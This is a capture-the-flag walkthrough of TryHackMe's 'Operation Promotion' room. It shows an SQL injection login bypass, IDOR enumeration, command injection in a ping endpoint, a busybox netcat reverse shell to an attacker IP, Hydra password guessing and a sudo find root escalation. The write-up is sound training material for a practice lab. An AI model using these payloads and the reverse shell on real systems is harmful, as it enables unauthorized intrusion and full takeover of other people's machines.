## Hello everyone!

Welcome to a CTF walkthrough, today we will explore “*Operation Promotion*”, an easy challenge from TryHackMe.

Without further ado, let’s get started!

## Information Gathering

First, as always, we will use Nmap to map our target:



![image](/THM/Operation_Promotion/OperationPromotion_images/1.png)



We can identify multiple services running on the target:

**SSH** (22 | OpenSSH, v9.6p1)

**HTTP** (80 | Apache, v2.4.58)

**NetBIOS** (139 | Samba, smbd 4)

**SMB** (445 | Samba, smbd 4)

We can start by inspecting the available **SMB shares**. Using `smbclient`, we can see that the `public` share is accessible **anonymously**.



![image](/THM/Operation_Promotion/OperationPromotion_images/2.png)



There is an intriguing file, we will check its content:



![image](/THM/Operation_Promotion/OperationPromotion_images/3.png)



Nothing interesting. Let’s move on the website hosted on port **80**:



![image](/THM/Operation_Promotion/OperationPromotion_images/4.png)



The root page is a static HTML page which doesn’t contain anything particularly useful, either in the source code. We can use **Gobuster** to map potential hidden directories:



![image](/THM/Operation_Promotion/OperationPromotion_images/5.png)



We can identify two interesting resources:

- `robots.txt` (disabling auto-indexation)
- `admin` (potentially an admin panel)

We can start by inspecting the `robots.txt` file to see whether we can find hidden resources that our scan didn’t fetch:



![image](/THM/Operation_Promotion/OperationPromotion_images/6.png)



It looks like the focus here will be on the `admin` folder we found earlier, so let’s inspect it:



![image](/THM/Operation_Promotion/OperationPromotion_images/7.png)



Indeed, there is an admin portal prompting for authentication.

Trying default credentials combinations such as `admin : admin` or `admin : password` doesn’t work. But what happens if try to inject a **SQL Injection** payload in the username field to bypass the login form using a boolean condition such as `admin' OR '1'='1-- -` ?



![image](/THM/Operation_Promotion/OperationPromotion_images/8.png)

![image](/THM/Operation_Promotion/OperationPromotion_images/9.png)



It works! We successfully exploited due to insufficient input sanitization in the authentication mechanism which led us to an **Authentication Bypass**. We now have access to the admin’s dashboard. The application appears to retrieve user information based on a numeric identifier. This behavior resembles an **IDOR** scenario, so we can test whether additional records are accessible. Let’s try to enter 1 for example and press the *Look Up* button:



![image](/THM/Operation_Promotion/OperationPromotion_images/10.png)



The web application uses a PHP endpoint named `lookup.php` that retrieve information about specific users. Can we learn more about the other users by incrementing the number?



![image](/THM/Operation_Promotion/OperationPromotion_images/11.png)



Indeed, we can! We retrieve information related to the **mvasquez** user. After incrementing again, we can find something interesting:



![image](/THM/Operation_Promotion/OperationPromotion_images/12.png)



The *Notes* field for this user reveals an interesting endpoint: `/admin/sysmaint-checks/ping.php`. It looks like a debugging function implemented in the /admin area, which is not exposed publicly.



![image](/THM/Operation_Promotion/OperationPromotion_images/13.png)



It looks like the `ping.php` file calls a `host` parameter to reach an IP or a domain name in order to perform connection testing, let’s try to use it:



![image](/THM/Operation_Promotion/OperationPromotion_images/14.png)



As we can see, the PHP file execute a system command, which is `ping`. Since the application appears to execute a system `ping` command based on user input, we can attempt to trick it to execute additional system commands with a separator string like `;` or `|` to end up the first command and initiate a new one:



![image](/THM/Operation_Promotion/OperationPromotion_images/15.png)



It worked! We successfully exploited a command injection vulnerability because the web application didn’t apply any filter against dangerous strings that can allow us to escape the current command executed through the `host` parameter. Since we can now execute any command on the system, we can initiate a reverse shell to a listener in order to obtain initial access on the target using the following command:

`busybox nc YOUR_IP NC_PORT -e sh`

(ensure that you have setup a **netcat listener** using `nc -lvnp PORT` to catch the connection)



![image](/THM/Operation_Promotion/OperationPromotion_images/16.png)



We successfully obtained initial access as **www-data**.

We can stabilize our obtained shell using the following commands:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

We can start our local enumeration by inspecting the /etc/passwd file to see through which user we can attempt to pivot our access:



![image](/THM/Operation_Promotion/OperationPromotion_images/17.png)



We can identify two users: **jford** and **ubuntu**. Since the **ubuntu** account is commonly present by default on Ubuntu systems, we will focus our attention on the **jford** user instead. Can we access his `/home/jford` directory?



![image](/THM/Operation_Promotion/OperationPromotion_images/18.png)



No, we can’t. We will need to elevate our privileges to retrieve the first flag.




## Horizontal Privilege Escalation



After performing basic local enumeration, we can find an interesting configuration file in the `/var/www/html/config` directory:



![image](/THM/Operation_Promotion/OperationPromotion_images/19.png)



There is a database configuration file storing the password’s hash for the user **jford**!

The password is stored using bcrypt, which significantly increases the computational cost of brute-force attacks. While weak passwords can still be recovered, attacking the hash directly would be less efficient than looking for alternative attack paths.

After inspecting the system for a while, I remembered the static root page of the website which contains strings resembling a very common password pattern:



![image](/THM/Operation_Promotion/OperationPromotion_images/20.png)



It is very common for employees to use the season+year pattern as their password, such as `Summer2026` or `Winter1995`. We can attempt to build a wordlist with multiple variants for Spring2026. Let’s create a file with the following passwords:



![image](/THM/Operation_Promotion/OperationPromotion_images/21.png)



We can now use **Hydra** to attempt all of these passwords on the **jford** user:



![image](/THM/Operation_Promotion/OperationPromotion_images/22.png)



Indeed, jford used a very common password based on the season and year indicated by the website. We now have the following credentials that we can use to log in as **jford** via SSH:

`jford : spring2026!`



![image](/THM/Operation_Promotion/OperationPromotion_images/23.png)



Wonderful, we can now list our current directory and retrieve the user flag:



![image](/THM/Operation_Promotion/OperationPromotion_images/24.png)





## Vertical Privilege Escalation



We now need to elevate our privilege one more time, but as the superuser in order to obtain the last flag, concluding to a total compromise of the target. We can start to enumerate our privilege escalation paths by running `sudo -l` to check whether our user can run any command with elevated privileges:



![image](/THM/Operation_Promotion/OperationPromotion_images/25.png)



It seems that we can run the `find` via `sudo` command as **root** (with root privileges) without providing any password. It means that if we can find a way to execute arbitrary command through the binary, it will be executed with full privileges, because `sudo` allows it, consequently allowing us to elevate our current privileges to full access. There is a very practical online resource dedicated to leverage Linux executables for local privilege escalation, it’s called GTFOBins. It can be very useful when we face a binary that can be run via `sudo` or if the SUID is set on it. For example, we can search for the `find` binary to determine whether it can be abused for privilege escalation:



![image](/THM/Operation_Promotion/OperationPromotion_images/26.png)



As we can see, there is a way to spawn an interactive system shell through `find` because the executable is able to execute system command via the `-exec` argument. Consequently, we can spawn a **root shell** using the following command:

`sudo find . -exec /bin/sh \; -quit`



![image](/THM/Operation_Promotion/OperationPromotion_images/27.png)



As expected, it spawned a **root shell** because we were able to run the executable with **root privileges**. We can now navigate to the /root directory and retrieve the final flag:



![image](/THM/Operation_Promotion/OperationPromotion_images/28.png)



Challenge completed!



![image](/THM/Operation_Promotion/OperationPromotion_images/29.png)




## Conclusion

This CTF was very interesting, we started by a standard enumeration that led us to an admin panel. We were able to exploit an authentication bypass through the use of a simple SQL Injection payload due to a poorly configured API with sanitization lacking of user’s input. Furthermore, we discovered a PHP file deployed to execute a specific system command that we were able to escape via unfiltered strings in order to exploit command injection and execute others commands in order to obtain an initial access over the target system. During the post-exploitation phase, we inferred a commonly used password pattern for the user **jford**, which led us to finally obtain full access through a **sudo misconfiguration** that we abused to spawn a Bash shell as **root**.

This room demonstrates how multiple low-severity issues can be chained together to achieve full system compromise. Starting from a vulnerable login form, we gained access to administrative functionality, exploited command injection to obtain a shell, recovered user credentials through contextual analysis, and finally leveraged a sudo misconfiguration to gain root access.

**Thank you for reading!**
